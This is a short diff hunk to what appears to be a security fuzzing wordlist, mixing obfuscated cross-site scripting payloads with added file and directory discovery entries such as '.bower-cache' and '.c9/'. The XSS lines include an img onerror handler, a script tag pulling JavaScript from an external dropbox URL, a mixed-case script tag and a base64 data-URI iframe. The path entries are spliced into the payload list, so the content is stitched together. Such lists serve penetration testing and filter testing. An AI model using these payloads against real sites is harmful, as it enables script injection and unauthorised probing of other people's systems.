@@ -35,7 +35,18 @@ robots.txt
 <img src=`%00`&NewLine; onerror=alert(1)&NewLine;
 
 <script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
-
+.bower-cache
+.bower-registry
+.bower-tmp
+.build/
+.buildpath
+.buildpath/
+.builds
+.bundle
+.bz2
+.bzr/README
+.c9/
+.c9revisions/
 <ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
 
 <iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
